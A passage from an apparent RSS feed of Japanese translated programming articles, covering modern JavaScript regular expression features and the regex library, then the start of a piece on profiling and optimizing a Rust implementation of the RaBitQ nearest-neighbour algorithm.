<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> matches <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span>str<span class="token punctuation">.</span><span class="token function">matchAll</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">.</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<h2>Unicodeプロパティ <a href="#Unicodeプロパティ">#</a><a name="Unicodeプロパティ"></a></h2>
<p>Unicodeプロパティ（ES2018で追加）は、<code class="language-text">\p{...}</code>構文とその否定形である`P{...}`を使用することで多言語テキストを強力に制御することを可能にします。マッチングできるプロパティは数百に及び、多岐にわたるUnicodeのカテゴリ、スクリプト、スクリプト拡張機能、バイナリプロパティを網羅します。</p>
<p>注：詳細については<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Unicode_character_class_escape">MDNのドキュメント</a>をご覧ください。</p>
<p>Unicodeプロパティでは<code class="language-text">u</code>（<code class="language-text">unicode</code>）または<code class="language-text">v</code>（<code class="language-text">unicodeSets</code>）フラグの使用が必須です。</p>
<h2><code class="language-text">v</code>フラグ <a href="#vフラグ">#</a><a name="vフラグ"></a></h2>
<p><code class="language-text">v</code>（<code class="language-text">unicodeSets</code>）フラグは、<code class="language-text">u</code>フラグのアップグレードとしてES2024で追加されました。これらのフラグを同時に使用することはできません。デフォルトのUnicode非対応モードでひそかにバグが紛れ込まないよう、ベストプラクティスとしていずれかのフラグを常に使用することが推奨されます。どちらを使用するかの判断は極めて単純です。<code class="language-text">v</code>フラグの環境（Node.js 20および2023年世代のブラウザ）のみのサポートで問題なければ<code class="language-text">v</code>フラグを使用し、それ以外の場合は<code class="language-text">u</code>フラグを使用します。</p>
<p><code class="language-text">v</code>フラグが実装されたことで、いくつかの新しい正規表現機能が追加されました。中でも特筆すべきなのが差集合と積集合です。これにより、<code class="language-text">A--B</code>（文字クラス内）を使用してAの文字列はマッチングし、Bの文字列はマッチングしないとか、<code class="language-text">A&amp;&amp;B</code>を使用してAとB両方の文字列をマッチングすることが可能になります。以下の例をご覧ください。</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// Matches all Greek symbols except the letter 'π'</span>
<span class="token operator">/</span><span class="token punctuation">[</span>\p<span class="token punctuation">{</span>Script_Extensions<span class="token operator">=</span>Greek<span class="token punctuation">}</span><span class="token operator">--</span>π<span class="token punctuation">]</span><span class="token operator">/</span>v

<span class="token comment">// Matches only Greek letters</span>
<span class="token operator">/</span><span class="token punctuation">[</span>\p<span class="token punctuation">{</span>Script_Extensions<span class="token operator">=</span>Greek<span class="token punctuation">}</span><span class="token operator">&amp;&amp;</span>\p<span class="token punctuation">{</span>Letter<span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token operator">/</span>v</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><code class="language-text">v</code>フラグに関する詳細や、vフラグの他の新機能については、Google Chromeチームによるこちらの<a href="https://v8.dev/features/regexp-v-flag">説明</a>をご覧ください。</p>
<h2>絵文字のマッチングについて <a href="#絵文字のマッチングについて">#</a><a name="絵文字のマッチングについて"></a></h2>
<p>絵文字とは🤩🔥😎👌などのことですが、絵文字がテキスト上で符号化される方法は複雑です。正規表現で絵文字をマッチングしたい場合、<strong>1つの絵文字が1つのUnicodeコードポイントで構成されることもあれば、多くのUnicodeコードポイントで構成されることもある</strong>ことを認識しておくことが重要です。絵文字の正規表現を独自に展開する多くの人（ライブラリもです！）がこの点を見落とし（あるいは適切に実装しておらず）、バグを発生させてしまっています。</p>
<p>「👩🏻‍🏫」（女性教師：明るい肌の色）の絵文字に関する以下の詳細は、絵文字がいかに複雑になり得るかを示しています。</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// Code unit length</span>
<span class="token string">'👩🏻‍🏫'</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>
<span class="token comment">// → 7</span>
<span class="token comment">// Each astral code point (above \uFFFF) is divided into high and low surrogates</span>

<span class="token comment">// Code point length</span>
<span class="token punctuation">[</span><span class="token operator">...</span><span class="token string">'👩🏻‍🏫'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>
<span class="token comment">// → 4</span>
<span class="token comment">// These four code points are: \u{1F469} \u{1F3FB} \u{200D} \u{1F3EB}</span>
<span class="token comment">// \u{1F469} combined with \u{1F3FB} is '👩🏻'</span>
<span class="token comment">// \u{200D} is a Zero-Width Joiner</span>
<span class="token comment">// \u{1F3EB} is '🏫'</span>

<span class="token comment">// Grapheme cluster length (user-perceived characters)</span>
<span class="token punctuation">[</span><span class="token operator">...</span><span class="token keyword">new</span> <span class="token class-name">Intl<span class="token punctuation">.</span>Segmenter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">segment</span><span class="token punctuation">(</span><span class="token string">'👩🏻‍🏫'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>
<span class="token comment">// → 1</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>幸い、JavaScriptは<code class="language-text">\p{RGI_Emoji}</code>により任意の完全な絵文字を個別にマッチングできる簡単な方法を追加しました。これは一度に複数のコードポイントをマッチングできる高度な「文字列プロパティ」のため、ES2024の<code class="language-text">v</code>フラグが必要になります。</p>
<p><code class="language-text">v</code>フラグに対応していない環境で絵文字のマッチングを行いたい場合は、<a href="https://github.com/mathiasbynens/emoji-regex">emoji-regex</a>と<a href="https://github.com/slevithan/emoji-regex-xs">emoji-regex-xs</a>の2つの素晴らしいライブラリをチェックしてみてください。</p>
<h2>より読みやすく、保守性とレジリエンスに優れた正規表現を書く <a href="#より読みやすく、保守性とレジリエンスに優れた正規表現を書く">#</a><a name="より読みやすく、保守性とレジリエンスに優れた正規表現を書く"></a></h2>
<p>正規表現機能は長年にわたり改良を重ねてきましたが、ネイティブのJavaScriptの正規表現は、複雑なものになると読むにしろ保守するにしろ、まだ難しい場合があります。</p>
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Regular Expressions are SO EASY!!!! <a href="https://t.co/q4GSpbJRbZ">pic.twitter.com/q4GSpbJRbZ</a></p>&mdash; Garabato Kid (@garabatokid) <a href="https://twitter.com/garabatokid/status/1147063121678389253?ref_src=twsrc%5Etfw">July 5, 2019</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
<p>ES2018で追加された名前付きキャプチャは、正規表現の自己文書化を推し進めた素晴らしい機能であり、ES6の<code class="language-text">String.raw</code>タグにより、<code class="language-text">RegExp</code>コンストラクタを使用する際にバックスラッシュをすべてエスケープ処理する必要がなくなりました。可読性に関する主な改良はそれくらいです。</p>
<p>しかし、<code class="language-text">regex</code>という名前の軽量で高性能な<a href="https://github.com/slevithan/regex">JavaScriptライブラリ</a>（筆者作）があり、これを使用することで正規表現が劇的に読みやすくなります。このライブラリは、欠けている主な機能をPCRE（Perl-Compatible Regular Expressions）から追加し、ネイティブのJavaScriptの正規表現を出力することで可読性の向上を実現しています。Babelのプラグインとして使用することもできるため、ビルド時に<code class="language-text">regex</code>の呼び出しがトランスパイルされます。したがって、デベロッパーエクスペリエンスが改善され、ユーザーにランタイムコストがかかることもありません。</p>
<p><a href="https://github.com/PCRE2Project/pcre2">PCRE</a>は、PHPが正規表現のサポートに使用している人気のCライブラリで、他の無数のプログラミング言語やツールで使用されています。</p>
<p><code class="language-text">regex</code>という名前のタグ付きテンプレートリレラルを提供するregexライブラリが、どのようにしてわかりやすく保守しやすい複雑な正規表現を書く手助けをするのか、簡単に説明します。以下で説明する新しい構文は、すべてPCREで同様に機能します。</p>
<h2>ちょっとした空白とコメント <a href="#ちょっとした空白とコメント">#</a><a name="ちょっとした空白とコメント"></a></h2>
<p><code class="language-text">regex</code>は、デフォルトで空白や行コメント（<code class="language-text">#</code>で始まる）を自由に正規表現に追加できるようにすることで、可読性を改善しています。</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">import</span> <span class="token punctuation">{</span>regex<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'regex'</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> date <span class="token operator">=</span> regex<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
  # Match a date in YYYY-MM-DD format
  (?&lt;year>  \d{4}) - # Year part
  (?&lt;month> \d{2}) - # Month part
  (?&lt;day>   \d{2})   # Day part
</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>これは、PCREの<code class="language-text">xx</code>フラグを使用するのと同じです。</p>
<h2>サブルーチンとサブルーチン定義グループ <a href="#サブルーチンとサブルーチン定義グループ">#</a><a name="サブルーチンとサブルーチン定義グループ"></a></h2>
<p>サブルーチンは<code class="language-text">\g&lt;name></code>（nameは名前付きグループを指します）のように書き、参照されたグループを独立したサブパターンとして扱い、現在の位置でマッチしようとします。これにより、サブパターンの合成と再利用が可能になり、可読性と保守性が改善されます。</p>
<p>例えば、以下の正規表現は「192.168.12.123」のようなIPv4のアドレスとマッチします。</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">import</span> <span class="token punctuation">{</span>regex<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'regex'</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> ipv4 <span class="token operator">=</span> regex<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">\b
  (?&lt;byte> 25[0-5] | 2[0-4]\d | 1\d\d | [1-9]?\d)
  # Match the remaining 3 dot-separated bytes
  (\. \g&lt;byte>){3}
\b</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>さらに、サブルーチン定義グループを通じて参照のみで使用するサブパターンを定義することができます。こちらは先ほど見た名前付きキャプチャの項目の正規表現の改善例です。</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> record <span class="token operator">=</span> <span class="token string">'Admitted: 2024-01-01\nReleased: 2024-01-03'</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> re <span class="token operator">=</span> regex<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
  ^ Admitted:\ (?&lt;admitted> \g&lt;date>) \n
    Released:\ (?&lt;released> \g&lt;date>) $

  (?(DEFINE)
    (?&lt;date>  \g&lt;year>-\g&lt;month>-\g&lt;day>)
    (?&lt;year>  \d{4})
    (?&lt;month> \d{2})
    (?&lt;day>   \d{2})
  )
</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
<span class="token keyword">const</span> match <span class="token operator">=</span> record<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>re<span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>match<span class="token punctuation">.</span>groups<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">/* → {
  admitted: '2024-01-01',
  released: '2024-01-03'
} */</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h2>モダンな正規表現のベースライン <a href="#モダンな正規表現のベースライン">#</a><a name="モダンな正規表現のベースライン"></a></h2>
<p><code class="language-text">regex</code>にはデフォルトで<code class="language-text">v</code>フラグが含まれているため、有効化し忘れることがありません。また、ネイティブの<code class="language-text">v</code>フラグをサポートしていない環境では、自動的に<code class="language-text">u</code>フラグに切り替わりつつも、<code class="language-text">v</code>フラグのエスケープ規則を適用し、正規表現の前方互換性と後方互換性を確保します。</p>
<p>また、エミュレートされた<code class="language-text">x</code>（ちょっとした空白とコメント）および<code class="language-text">n</code>（「名前付きキャプチャのみ」モード）フラグをデフォルトで暗黙的に有効化するため、毎回これらの上位モードを選択する必要がありません。さらに、タグ付きテンプレートリテラルであるため、<code class="language-text">RegExp</code>コンストラクタの場合のようにバックスラッシュ<code class="language-text">\\\\</code>をエスケープ処理する必要がありません。</p>
<h2>アトミックグループと絶対最大量指定子で破壊的なバックトラックを回避できる <a href="#アトミックグループと絶対最大量指定子で破壊的なバックトラックを回避できる">#</a><a name="アトミックグループと絶対最大量指定子で破壊的なバックトラックを回避できる"></a></h2>
<p>アトミックグループと絶対最大量指定子も、<code class="language-text">regex</code>ライブラリで追加された強力な機能です。これらは主にパフォーマンスと破壊的なバックトラック（ReDoSとも呼ばれ、特定の正規表現が特定の、あまり一致しない文字列を検索する際に膨大な時間がかかる深刻な問題）に対するレジリエンスに関する機能ですが、より単純なパターンを書けるようにすることで可読性も改善します。</p>
<p><strong>注</strong>：詳しくは<code class="language-text">regex</code>の<a href="https://github.com/slevithan/regex#atomic-groups">ドキュメント</a>をご覧ください。</p>
<h2>今後実装されそうなJavaScript正規表現の改良 <a href="#今後実装されそうなJavaScript正規表現の改良">#</a><a name="今後実装されそうなJavaScript正規表現の改良"></a></h2>
<p>JavaScriptの正規表現を改良するための様々な提案が現在検討されています。JavaScriptの将来バージョンに組み込まれる見込みの高い3つの提案について以下にご紹介します。</p>
<h2>重複する名前付きキャプチャグループ <a href="#重複する名前付きキャプチャグループ">#</a><a name="重複する名前付きキャプチャグループ"></a></h2>
<p>これはステージ3（最終化間近）の<a href="https://github.com/tc39/proposal-duplicate-named-capturing-groups">改良案</a>です。さらに良いことに、直近の情報によるとこの改良はすべての主要ブラウザで機能します。</p>
<p>名前付きキャプチャが最初に導入された際、すべての<code class="language-text">(?&lt;name>...)</code>キャプチャで一意の名前を使用することが求められました。しかし、正規表現には複数の代替パスがある場合もあり、それぞれのパスで同じグループ名を使用した方がコードを単純化できます。</p>
<p>以下の例をご覧ください。</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(?&lt;year>\d{4})-\d\d|\d\d-(?&lt;year>\d{4})</span><span class="token regex-delimiter">/</span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p>この改良案は、まさにこの例の構文を可能にするもので、このような構文で「重複するキャプチャグループ名」エラーが発生するのを防ぎます。ただし、各代替パスの中では引き続き一意の名前を使用する必要があります。</p>
<h2>パターン修飾子（別名：フラググループ） <a href="#パターン修飾子（別名：フラググループ）">#</a><a name="パターン修飾子（別名：フラググループ）"></a></h2>
<p>こちらもステージ3の<a href="https://github.com/tc39/proposal-regexp-modifiers">改良案</a>です。Chrome/Edge 125およびOpera 111ではすでにサポートされており、<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1899813">近々</a>Firefoxでもサポートされる予定です。Safariについては<a href="https://bugs.webkit.org/show_bug.cgi?id=275672">今のところ</a>不明です。</p>
<p>パターン修飾子は<code class="language-text">(?ims:...)</code>、<code class="language-text">(?-ims:...)</code>、<code class="language-text">(?im-s:...)</code>のいずれかを使用し、正規表現の特定の部分のみについて<code class="language-text">i</code>、<code class="language-text">m</code>、<code class="language-text">s</code>フラグのオンとオフを切り替えます。</p>
<p>以下の例をご覧ください。</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">hello-(?i:world)</span><span class="token regex-delimiter">/</span></span>
<span class="token comment">// Matches 'hello-WORLD' but not 'HELLO-WORLD'</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<h2><code class="language-text">RegExp.escape</code>による正規表現の特殊文字のエスケープ処理 <a href="#RegExp.escapeによる正規表現の特殊文字のエスケープ処理">#</a><a name="RegExp.escapeによる正規表現の特殊文字のエスケープ処理"></a></h2>
<p>この<a href="https://github.com/tc39/proposal-regex-escaping">改良案</a>は、長い時間を経てようやく最近ステージ3に到達しました。まだどの主要ブラウザも対応していません。謳い文句どおり<code class="language-text">RegExp.escape(str)</code>関数を提供することで、正規表現の特殊文字がすべてエスケープ処理された状態で文字列を返し、リテラル文字列としてマッチングすることを可能にします。</p>
<p>この機能がすぐに必要な場合、<a href="https://github.com/sindresorhus/escape-string-regexp">escape-string-regexp</a>が最も広く使われているパッケージです（毎月5億回以上ダウンロードされています）。このnpmパッケージは、最低限のエスケープ処理を行う超軽量の専用ユーティリティです。ほとんどのケースではこれで十分ですが、エスケープ処理を行った文字列が正規表現内のどの位置でも安全に使用できることを確認する必要がある場合、<code class="language-text">escape-string-regexp</code>はこの記事ですでに紹介した<code class="language-text">regex</code>ライブラリを推奨しています。<code class="language-text">regex</code>ライブラリは、埋め込み文字列のエスケープ処理を補間により、<a href="https://github.com/slevithan/regex#interpolating-escaped-strings">コンテクストを意識した方法</a>で行います。</p>
<h2>まとめ <a href="#まとめ">#</a><a name="まとめ"></a></h2>
<p>この記事では、JavaScriptの正規表現の過去、現在、そして未来についてお話しました。</p>
<p>正規表現についてさらに詳しく学びたい方は、<a href="https://github.com/slevithan/awesome-regex">Awesome Regex</a>に優れた正規表現テスター、チュートリアル、ライブラリ、その他のリソースが紹介されているのでぜひご覧ください。正規表現のクロスワードパズルに挑戦してみたい方は、<a href="https://regexle.com/">regexle</a>をお試しください。</p>
<p>皆さんの実りある構文解析と正規表現の可読性向上の一助になれば幸いです。</p>]]></content:encoded></item><item><title><![CDATA[アルゴリズムのパフォーマンスを段階的に改善する]]></title><description><![CDATA[最近、筆者はRaBitQという新しい近似最近傍探索アルゴリズムを使ったさまざまな試みを行っています。このアルゴリズムを提案した論文の著者はすでにC++実装を提供しており、実行速度はかなり速いです。筆…]]></description><link>https://postd.cc/rabitq-bench/</link><guid isPermaLink="false">https://postd.cc/rabitq-bench/</guid><category><![CDATA[開発手法・プロジェクト管理]]></category><category><![CDATA[パフォーマンス]]></category><category><![CDATA[アルゴリズム]]></category><category><![CDATA[Rust]]></category><pubDate>Thu, 28 Nov 2024 00:00:01 GMT</pubDate><content:encoded><![CDATA[<p>最近、筆者は<a href="https://arxiv.org/abs/2405.12497">RaBitQ</a>という新しい近似最近傍探索アルゴリズムを使ったさまざまな試みを行っています。このアルゴリズムを提案した論文の著者はすでに<a href="https://github.com/gaoj0017/RaBitQ">C++実装</a>を提供しており、実行速度はかなり速いです。筆者はこれを<a href="https://github.com/kemingy/rabitq">Rustに書き換えようとしました</a>（いわゆるRiiR（Rewrite it in Rust）です）が、実装結果は元のアルゴリズムよりも大幅に遅いことが判明しました。この記事では、アルゴリズムのパフォーマンスを段階的に改善する方法をご紹介します。</p>
<h2>環境の準備</h2>
<h3>データセット</h3>
<p>最も重要なのは、適当なデータセットをいくつか用意することです。前述の論文では、<code class="language-text">sift_dim128_1m_l2</code>と<code class="language-text">gist_dim960_1m_l2</code>という2つのデータセットについての結果が示されています。このデータセットでは、128項目と960項目というのがよく使われるサイズであり、1,000,000個のデータポイント（ベクトル）があれば性能を測るのに十分だということです。つまり、これらのデータセットを使うことで、アルゴリズムの性能をしっかりと評価できるということです。データセットは<a href="http://corpus-texmex.irisa.fr/">こちら</a>からダウンロードできます。（こちらのサイトはTLSに対応しておらず、FTPダウンロードしか提供していません。）</p>
<p>これらのデータセットは、一般的なベクトル形式である<code class="language-text">fvecs/ivecs</code>を使用しています。</p>
<div class="gatsby-highlight" data-language="python"><pre style="counter-reset: linenumber NaN" class="language-python line-numbers"><code class="language-python"><span class="token operator">|</span> dim <span class="token punctuation">(</span><span class="token number">4</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">|</span> vector <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> dim <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">|</span>
<span class="token operator">|</span> dim <span class="token punctuation">(</span><span class="token number">4</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">|</span> vector <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> dim <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">|</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token operator">|</span> dim <span class="token punctuation">(</span><span class="token number">4</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">|</span> vector <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> dim <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">|</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>読み取り／書き込み用のスクリプトは筆者の<a href="https://gist.github.com/kemingy/2f503fcfff86b9e0197e975c02359157">Gist</a>から取得できます。</p>
<h3>プロファイリングツール</h3>
<p>Rustコードのプロファイリングには<a href="https://blog.mapotofu.org/blogs/rabitq-bench/#:~:text=I%20use-,samply,-to%20profile%20the">samply</a>を使用しています。このツールは<a href="https://profiler.firefox.com/">Firefox Profiler</a>に追加して使用できます。プロファイリングの結果は、クラウドにアップロードすることで他者と共有することもできます。こちらは<a href="https://share.firefox.dev/3Y4Hppz">Gistで公開されているC++版のプロファイリング例</a>です。ビューはFlameGraphとCallTreeが最も一般的です。パフォーマンスイベント権限を付与し、mlockの上限を増やす必要があります。</p>
<div class="gatsby-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'1'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /proc/sys/kernel/perf_event_paranoid
<span class="token function">sudo</span> <span class="token function">sysctl</span> <span class="token assign-left variable">kernel.perf_event_mlock_kb</span><span class="token operator">=</span><span class="token number">2048</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p><a href="https://godbolt.org/">GodBolt</a>のCompiler Explorerも、C++とRustの関数のアセンブリコードを比較するのに役立ちます。</p>
<h3>Cargoプロファイル</h3>
<p>リリースビルドにデバッグ情報を含めるには、<code class="language-text">Cargo.toml</code>に新たなプロファイルを追加します。</p>
<div class="gatsby-highlight" data-language="toml"><pre style="counter-reset: linenumber NaN" class="language-toml line-numbers"><code class="language-toml"><span class="token punctuation">[</span><span class="token table class-name">profile.perf</span><span class="token punctuation">]</span>
<span class="token key property">inherits</span> <span class="token punctuation">=</span> <span class="token string">"release"</span>
<span class="token key property">debug</span> <span class="token punctuation">=</span> <span class="token boolean">true</span>
<span class="token key property">codegen-units</span> <span class="token punctuation">=</span> <span class="token number">16</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>コンパイルコストとランタイム速度は、プロファイリングにおけるユーザーエクスペリエンスを大きく左右します。</p>
<ul>
<li><code class="language-text">cargo build</code>はコンパイル速度は速いものの、Pythonよりもコードの実行速度は遅い場合がある</li>
<li><code class="language-text">cargo build --release</code>は、コードの実行速度は速いものの、コンパイルには時間がかかる場合がある
ベンチマーキングには<code class="language-text">opt-level = 3</code>を使用することを推奨します。
以下の設定の使用が推奨されているのを目にしましたが、筆者の場合はコンパイル速度が遅くなり、パフォーマンスの改善は全く見られませんでした。</li>
</ul>
<div class="gatsby-highlight" data-language="toml"><pre style="counter-reset: linenumber NaN" class="language-toml line-numbers"><code class="language-toml"><span class="token key property">codegen-units</span> <span class="token punctuation">=</span> <span class="token number">1</span>
<span class="token key property">lto</span> <span class="token punctuation">=</span> <span class="token string">"fat"</span>
<span class="token key property">panic</span> <span class="token punctuation">=</span> <span class="token string">"abort"</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<h3>ベンチマークツール</h3>
<p><a href="https://github.com/bheisler/criterion.rs">Criterion</a>は、統計に基づく優れたベンチマークツールです。関連するベンチマークコードをすべて格納するために、新たな<a href="https://github.com/kemingy/rs_bench">リポジトリ</a>を作成しました。ベンチマークコードは同じリポジトリに入れる必要があるようです。</p>
<p>注目すべき点として、ベンチマークの結果はあまり安定していません。筆者の場合はコードに手を加えていない状態で<code class="language-text">±10%</code>の差異が見られました。ノートパソコンを使用している場合、高温によりCPUがアンダークロックし、さらに差異が広がる可能性があります。</p>
<p>関数のベンチマークには、いくつかの異なるパラメータを使用することをおすすめします。この場合、筆者は異なる項目のベクトルを使用します。すべての項目の結果がプラスであれば、通常は改善が効果的であることを意味します。</p>
<h3>指標</h3>
<p>最初からいくつかの指標を追加しましょう。指標をチェックすることで、多くのバグやパフォーマンスの問題を見つけることができます。筆者は、現行の要件が単純であるため直接<code class="language-text">AtomicU64</code>を使用していますが、後で<a href="https://github.com/prometheus/client_rust">Prometheusを使った指標</a>に移行するかもしれません。
指標／ロギング／トレースが多すぎるとパフォーマンスに影響が出る可能性があるため、これらを追加する際には注意してください。</p>
<h3>リソース</h3>
<p>ベンチマークの際に、筆者はエンドツーエンドのQPSが極めて不安定であることに気がつきました。コードを再コンパイルしていなくても、翌朝にはベンチマークの結果に<strong>15</strong>%の改善または悪化が見られる場合もあります。また、筆者はVSCodeの拡張機能「rust-analyzer」を使用しているため、CPUが完全にアイドル状態ではなく、CPUの使用率は低いもののベンチマークの結果に大きな影響を及ぼすことが分かりました。ちなみに、筆者は8つの高性能コアと8つの高効率コアで構成された<a href="https://www.intel.com/content/www/us/en/products/sku/230500/intel-core-i713700k-processor-30m-cache-up-to-5-40-ghz/specifications.html">Intel Core i7-13700K</a>を使用しており、プログラムはシングルスレッドです。</p>
<p>筆者は<code class="language-text">taskset</code>を使用してプロセスを実行するCPUを指定しています。そうすることで、種類の異なるコアのスケジューリングの影響を受けることはありません。</p>
<p>第13〜14世代のIntel Core CPUは電圧が非常に高いため不安定です。筆者はこの問題をBIOSで修正しました。</p>
<p>クラウドの仮想マシンはCPU温度の影響を受けないかもしれませんが、クラウドプロバイダーにはCPUのスロットリングやオーバーコミットに関する独自のポリシーがある場合があります。</p>
<h2>段階的な改善</h2>
<h3>単純な実装から始める</h3>
<p>筆者の<a href="https://github.com/kemingy/rabitq/tree/dbfd54bd5d739b0729dc28e6fbd8d5413b019561">最初のリリース</a>は、<a href="https://docs.rs/nalgebra">nalgebra</a>という代数ライブラリをベースにRaBitQアルゴリズムを実装しました。主な理由は、RaBitQアルゴリズムにおいて重要なステップである直交行列を取得するためにQR分解を使う必要があるからです。また、成熟した線形代数ライブラリは行列やベクトルを操作するのに役立つ関数を多く提供するため、アルゴリズムを実装しやすいという利点もあります。Pythonで<code class="language-text">numpy</code>を使わずに行列の乗算、射影、分解に関するアルゴリズムを実装することを考えてみてください。まさに悪夢です。</p>
<p><code class="language-text">nalgebra</code>はこのようなシナリオ向けに最適化されているため、パフォーマンスは良いはずだと考えました。しかし、ベンチマークは筆者の予想よりもかなり遅い結果となりました。<code class="language-text">numpy</code>で再実装した方がはるかに速いでしょう:(</p>
<p><a href="https://share.firefox.dev/3AwiVNR">プロファイリング</a>によると、<code class="language-text">f32::clone()</code>の呼び出しが多数あります。全体の時間の約33%を占めており、<code class="language-text">query_one</code>関数に注目すると44%となります。この結果から、一部のベクトルについてメモリを事前に割り当て、同じイテレーション内で再利用するという非常に一般的な裏技が使えることが分かります。したがって、<code class="language-text">(x - y).norm_squared()</code>を使う代わりに、<code class="language-text">(x - y)</code>の結果を格納する別のベクトルをあらかじめ宣言する必要があり、結果的に<code class="language-text">x.sub_to(y, &amp;mut z); z.norm_squared()</code>となります。<a href="https://github.com/kemingy/rabitq/commit/23f9aff4c8b3303c0a03ac9a7472ada8cc915a3b">コミット23f9aff</a>をご覧ください。</p>
<p>ほとんどの代数ライブラリと同様に、このベクトルは列優先で行列を格納するため、行よりも列に対して処理を順番に繰り返し実行した方が速いことを意味します。イテレーションの前に行列を転置しなくてはならないのは少し面倒であり、ベクトルと行列の乗算がすべてコンパイル時に項目のミスマッチエラー（<code class="language-text">1 x dyn</code>または<code class="language-text">dyn x 1</code>）を検出できるとは限りません。</p>
<h3>CPUターゲット</h3>
<p>RaBitQは、バイナリの内積距離を用いておおよその距離を推定します。距離は以下により計算します。</p>
